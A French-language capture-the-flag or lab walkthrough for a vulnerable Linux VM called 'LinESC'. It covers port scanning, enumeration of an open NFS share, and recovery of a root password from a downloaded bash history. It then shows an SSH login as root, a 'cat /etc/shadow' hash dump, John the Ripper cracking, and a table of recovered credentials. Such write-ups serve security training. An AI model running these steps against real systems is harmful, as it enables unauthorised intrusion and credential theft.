# LinESC
1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[parrot@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53

Entrer une IP: 192.168.56.37    
Entrer un rate: 1000
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2025-01-16 17:53:53 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-16 18:56 CET           
NSE: Loaded 150 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:56
Completed NSE at 18:56, 10.01s elapsed
Initiating NSE at 18:56
Completed NSE at 18:56, 0.00s elapsed
Initiating ARP Ping Scan at 18:56
Scanning 192.168.56.37 [1 port]
Completed ARP Ping Scan at 18:56, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:56
Completed Parallel DNS resolution of 1 host. at 18:56, 0.00s elapsed
Initiating SYN Stealth Scan at 18:56
Scanning 192.168.56.37 [6 ports]
Discovered open port 22/tcp on 192.168.56.37
Discovered open port 111/tcp on 192.168.56.37
Discovered open port 44595/tcp on 192.168.56.37
Discovered open port 36658/tcp on 192.168.56.37
Discovered open port 52366/tcp on 192.168.56.37
Discovered open port 2049/tcp on 192.168.56.37
Completed SYN Stealth Scan at 18:56, 0.02s elapsed (6 total ports)
Initiating Service scan at 18:56
Scanning 6 services on 192.168.56.37
```

&nbsp;

**🖥️ NetExec**

Partage `NFS` sans authentification

```
┌─[parrot@parrot]─[~]
└──╼ $sudo nxc nfs 192.168.56.37 --shares
[sudo] Mot de passe de parrot : 
[*] Initializing NFS protocol database
NFS         192.168.56.37   59451  192.168.56.37    [*] Target supported NFS versions: (2, 3, 4)
NFS         192.168.56.37   59451  192.168.56.37    [*] Enumerating NFS Shares
NFS         192.168.56.37   59451  192.168.56.37    UID        Perms    Storage Usage    Share                          Access List    
NFS         192.168.56.37   59451  192.168.56.37    ---        -----    -------------    -----                          -----------    
NFS         192.168.56.37   59451  192.168.56.37    1000       rw-      840.8MB/38.0GB    /home/muhammad                 *              
```

&nbsp;

Énumération des fichiers présent dans le partage

```
┌─[parrot@parrot]─[~]
└──╼ $sudo nxc nfs 192.168.56.37 --enum-shares
NFS         192.168.56.37   59451  192.168.56.37    [*] Target supported NFS versions: (2, 3, 4)
NFS         192.168.56.37   59451  192.168.56.37    [*] Enumerating NFS Shares Directories
NFS         192.168.56.37   59451  192.168.56.37    [+] /home/muhammad
NFS         192.168.56.37   59451  192.168.56.37    UID        Perms    File Size      File Path                                     Access List    
NFS         192.168.56.37   59451  192.168.56.37    ---        -----    ---------      ---------                                     -----------    
NFS         192.168.56.37   59451  192.168.56.37    0          rwx      44.0B          /home/muhammad/vuln/4/script.sh               *              
NFS         192.168.56.37   59451  192.168.56.37    0          rw-      1.0KB          /home/muhammad/vuln/4/passwd                  *              
NFS         192.168.56.37   59451  192.168.56.37    0          r--      75.0B          /home/muhammad/vuln/2/sudo.c                  *              
NFS         192.168.56.37   59451  192.168.56.37    0          --x      8.6KB          /home/muhammad/vuln/2/sudo                    *              
NFS         192.168.56.37   59451  192.168.56.37    0          r--      75.0B          /home/muhammad/vuln/1/suid.c                  *              
NFS         192.168.56.37   59451  192.168.56.37    0          rwx      8.6KB          /home/muhammad/vuln/1/suid                    *              
NFS         192.168.56.37   59451  192.168.56.37    1000       rw-      1.6KB          /home/muhammad/vuln/3/key                     *              
NFS         192.168.56.37   59451  192.168.56.37    1000       rw-      220.0B         /home/muhammad/.bash_logout                   *              
NFS         192.168.56.37   59451  192.168.56.37    1000       rw-      2.9KB          /home/muhammad/.bashrc                        *              
NFS         192.168.56.37   59451  192.168.56.37    1000       rw-      586.0B         /home/muhammad/.profile                       *              
NFS         192.168.56.37   59451  192.168.56.37    1000       rw-      0B             /home/muhammad/.sudo_as_admin_successful      *              
NFS         192.168.56.37   59451  192.168.56.37    1000       rw-      502.0B         /home/muhammad/.mysql_history                 *              
NFS         192.168.56.37   59451  192.168.56.37    1000       rw-      442.0B         /home/muhammad/.ssh/known_hosts               *              
NFS         192.168.56.37   59451  192.168.56.37    1000       rw-      591.0B         /home/muhammad/.bash_history                  *              

```

&nbsp;

Téléchargement du fichier d’historique des commande `.bash_history`

```
┌─[parrot@parrot]─[~]
└──╼ $sudo nxc nfs 192.168.56.37 --get-file /home/muhammad/.bash_history cmd_history
NFS         192.168.56.37   59451  192.168.56.37    [*] Target supported NFS versions: (2, 3, 4)
NFS         192.168.56.37   59451  192.168.56.37    [*] Downloading /home/muhammad/.bash_history to cmd_history
NFS         192.168.56.37   59451  192.168.56.37    File successfully downloaded to cmd_history from /home/muhammad/.bash_history
```

&nbsp;

Voyons ce que contient l’historique des commande

```
┌─[parrot@parrot]─[~]
└──╼ $cat cmd_history
./suid 
su root
./suid.py
ls -la
su root
ls
rm suid.py 
ls
ls -la
sudo su
./suid.py
ls
su root
ls
./suid.py
su root
sudo /home/muhammad/vuln/2/sudo 
ls
sudo -l
sudo /home/muhammad/vuln/2/sudo
sudo -l
sudo /home/muhammad/vuln/2/sudo
ls
cd /tmp/
ls
echo"follow me @nasefmuhammad"
sudo root chicken
vi raptor_udf2.c
ls
gcc -g -c raptor_udf2.c
gcc -g -c -fPIC raptor_udf2.c
ls
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
echo os.system('/bin/bash')
echo os.system('/bin/bash)
mysql -u root -p
cd /usr/lib/mysql
sudo apt-get remove mysql-server
```

&nbsp;

Teston le mot de passe trouver en claire précédemment

```
┌─[parrot@parrot]─[~]
└──╼ $nxc ssh 192.168.56.37 -u root -p chicken
SSH         192.168.56.37   22     192.168.56.37    [*] SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu3
SSH         192.168.56.37   22     192.168.56.37    [+] root:chicken (Pwn3d!) Linux - Shell access!
```

&nbsp;

Dump des `hash` des users

```
┌─[parrot@parrot]─[~]
└──╼ $nxc ssh 192.168.56.37 -u root -p chicken -x 'cat /etc/shadow'
SSH         192.168.56.37   22     192.168.56.37    [*] SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu3
SSH         192.168.56.37   22     192.168.56.37    [+] root:chicken (Pwn3d!) Linux - Shell access!
SSH         192.168.56.37   22     192.168.56.37    [+] Executed command
SSH         192.168.56.37   22     192.168.56.37    root:$1$CAd5wg19$PPFB77TbLO1GjQZNuvecp.:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    daemon:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    bin:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    sys:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    sync:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    games:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    man:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    lp:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    mail:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    news:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    uucp:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    proxy:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    www-data:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    backup:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    list:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    irc:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    gnats:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    nobody:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    libuuid:!:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    dhcp:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    syslog:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    klog:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    muhammad:$1$CpL1w2ul$ARqlJYOeBlsxRbsX0RHN.1:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    sshd:*:18598:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    mysql:!:18599:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    statd:*:18599:0:99999:7:::
SSH         192.168.56.37   22     192.168.56.37    

```

&nbsp;

**🧨 JohnTheRipper**

Crack des hash trouver

```
┌─[parrot@parrot]─[~]
└──╼ $john hash 
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
nasef            (muhammad)     
1g 0:00:00:33 DONE 3/3 (2025-01-15 22:28) 0.02968g/s 100098p/s 100098c/s 100098C/s nasso..nast1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
┌─[parrot@parrot]─[~]
└──╼ $john --show hash 
muhammad:nasef:18598:0:99999:7:::

1 password hash cracked, 0 left

```

&nbsp;

Cred trouver

| Users | Password |
| --- | --- |
| root | chicken |
| muhammad | nasef |
